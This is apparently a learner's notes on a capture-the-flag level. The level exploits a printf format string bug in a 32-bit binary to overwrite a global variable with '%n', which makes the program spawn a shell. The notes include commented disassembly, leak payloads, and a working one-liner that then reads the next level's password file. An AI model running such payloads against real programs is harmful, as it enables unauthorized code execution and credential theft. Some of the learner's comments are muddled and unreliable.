- attack: format string exploitation (address leaks)
- binary behavior: fgets argument and send it to printf, if global argument = 64 run the shell
- targeted functions: v and main
- vulnerability in v: printf() without argument (Bugs section in printf man)
- defense: fget

Method:
- do stack leakage
- find in leakage the position of the buffer (find repetition and compare with hex ASCII table)
- find the address global variable and its correct condition
- find the padding
- overwrite buffer and you will see 804988c on the 4th position
- overwrite buffer with padding and put address of global variable instead of return address
- and write 64 to the global variable
 
Info:
- positon of buffer in stack - 4

- 0804988c - address of global variable
- 8c980408 - same in little-endian
- same in hex - \x8c\x98\x04\x08
- the password - 0x40 or 64

- offset code structure: 64 = 4 (global variable address) + 60 (padding)


Code:
objdump -d ./level3
objdump -t level3
 ./level3
111111 %p %p %p %p %p
(python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"';cat) | ./level3
(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; echo "cat /home/user/level4/.pass") | ./level3

QA
- why the leakage of global varibale happens?
- Printf has no specificators. If we pass %smth in the stdin, prinf will consider it as specificator. Printf will try to print arguments, when they end - prinf will use global variables

- what is 0x200?

- how to find a global variable?
- objdump -t level3 -> 0804988c g     O .bss   00000004              m

- why padding is 64?

- how do we pass the global varibale?
- "A" * 60 + "%4$n - here %n will write the number of preceding bytes (64) and put it the pointed location: the position of 4th argument (buffer)

Functions

0804851a <main>:
 804851a:       55                      push   %ebp
 804851b:       89 e5                   mov    %esp,%ebp
 804851d:       83 e4 f0                and    $0xfffffff0,%esp
 8048520:       e8 7f ff ff ff          call   80484a4 <v>
 8048525:       c9                      leave
 8048526:       c3                      ret



080484a4 <v>:
 80484a4:       55                      push   %ebp
 80484a5:       89 e5                   mov    %esp,%ebp
 80484a7:       81 ec 18 02 00 00       sub    $0x218,%esp
 80484ad:       a1 60 98 04 08          mov    0x8049860,%eax
 80484b2:       89 44 24 08             mov    %eax,0x8(%esp)
 80484b6:       c7 44 24 04 00 02 00    movl   $0x200,0x4(%esp) # 512
 80484bd:       00
 80484be:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax # buffer=520
 80484c4:       89 04 24                mov    %eax,(%esp)
 80484c7:       e8 d4 fe ff ff          call   80483a0 <fgets@plt> #defence
 80484cc:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 80484d2:       89 04 24                mov    %eax,(%esp)
 80484d5:       e8 b6 fe ff ff          call   8048390 <printf@plt> #exploit for attack
 80484da:       a1 8c 98 04 08          mov    0x804988c,%eax # global variable
 80484df:       83 f8 40                cmp    $0x40,%eax # comparison of eax with 64
 80484e2:       75 34                   jne    8048518 <v+0x74> # if equals to 0 
 80484e4:       a1 80 98 04 08          mov    0x8049880,%eax
 80484e9:       89 c2                   mov    %eax,%edx
 80484eb:       b8 00 86 04 08          mov    $0x8048600,%eax
 80484f0:       89 54 24 0c             mov    %edx,0xc(%esp)
 80484f4:       c7 44 24 08 0c 00 00    movl   $0xc,0x8(%esp)
 80484fb:       00
 80484fc:       c7 44 24 04 01 00 00    movl   $0x1,0x4(%esp)
 8048503:       00
 8048504:       89 04 24                mov    %eax,(%esp)
 8048507:       e8 a4 fe ff ff          call   80483b0 <fwrite@plt> # Wait what?
 804850c:       c7 04 24 0d 86 04 08    movl   $0x804860d,(%esp)
 8048513:       e8 a8 fe ff ff          call   80483c0 <system@plt> #exploit for shell
 8048518:       c9                      leave # jump here if 0
 8048519:       c3                      ret

             